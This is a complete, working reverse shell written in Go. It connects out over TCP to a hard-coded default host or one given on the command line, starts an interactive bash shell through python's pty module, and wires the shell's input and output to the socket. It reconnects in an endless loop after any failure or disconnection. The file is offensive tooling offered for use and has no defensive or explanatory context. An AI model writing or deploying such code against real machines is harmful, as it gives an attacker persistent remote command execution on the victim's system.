// Reverse Shell in Go
// Test with nc -lvp 9999 
package main

import (
    "net"
    "os/exec"
    "os"
    "time"
    "fmt"
)

func main() {

    dest := "gabrio.tognozzi.net"
    port := "9998"
    if len(os.Args) >= 3 {
        dest = os.Args[1]
        port = os.Args[2]
    }else if len(os.Args) >=2 {
        dest = os.Args[1]
    }else {
        fmt.Printf("usage: %s <ip-addr> <port>\n",os.Args[0])
        fmt.Println("using defaults")
    }

    fmt.Printf("Connecting to: %s %s\n",dest,port)
    reverse(dest+":"+port)
}

func reverse(host string) {
    c, err := net.Dial("tcp", host)
    if nil != err {
        if nil != c {
            c.Close()
        }
        time.Sleep(time.Second)
        fmt.Printf("Retrying to: %s\n",host)
        reverse(host)
    }
    if c != nil {
        fmt.Println("Connected to host.\n")
    }
    cmd := exec.Command("/bin/bash","-c","python -c  'import pty; pty.spawn(\"/bin/bash\")'")
    //cmd := exec.Command("/bin/bash")

    cmd.Stdin, cmd.Stdout, cmd.Stderr = c, c, c


    err = cmd.Run()
    if err != nil {
        fmt.Printf("Error running cmd: %s\n",err.Error())
    }

    c.Close()
    reverse(host)
}
